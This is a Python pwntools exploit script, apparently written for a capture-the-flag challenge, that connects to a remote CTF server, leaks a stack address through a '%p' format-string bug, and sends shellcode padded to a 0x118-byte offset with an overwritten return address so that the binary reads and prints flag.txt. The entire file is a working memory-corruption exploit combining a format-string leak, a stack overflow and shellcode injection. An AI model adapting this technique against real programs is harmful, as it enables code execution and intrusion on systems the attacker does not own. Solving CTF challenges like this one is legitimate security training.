
#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-F', '#{pane_pid}', '-P']
# Load binaries
libc = ELF("./libc.so.6", checksec=False)
#binary = ELF("./director_easy", checksec=False)
binary= ELF("./patched_patched")
p=remote("challs.ctf.cert.unlp.edu.ar", 41216)

# Start process
#p = process("./patched_patched")

#gdbscript='''
#  break *main+280
#'''
#gdb.attach(p,gdbscript)

# Step 1: Leak libc address via format string
data = b"%p"
p.sendline(data)
p.recvuntil(b"You entered:")
libc_leak_str = p.recvline().strip()

# Parse leaked address
try:
    libc_leak = int(libc_leak_str, 16)
except:
    log.error(f"Failed to parse leak: {libc_leak_str}")
    p.close()
    exit(1)

rbp = libc_leak + 0x2c0

log.info(f"rbp: {hex(rbp)}")


offset=0x118


#shellcode=asm(shellcraft.readfile("/src/flag.txt",4))

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x0a4b4f
    push rbx

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 3
    mov rax, 1
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall
""")

shellcode=asm(shellcraft.readfile("flag.txt",1))


print(f"Shellcode: {shellcode.hex()}")
print(f"Length: {len(shellcode)} bytes")


payload = shellcode

payload += b"a"*(offset-len(payload))

payload +=p64(rbp-0x110)



p.sendline(payload)

p.interactive()
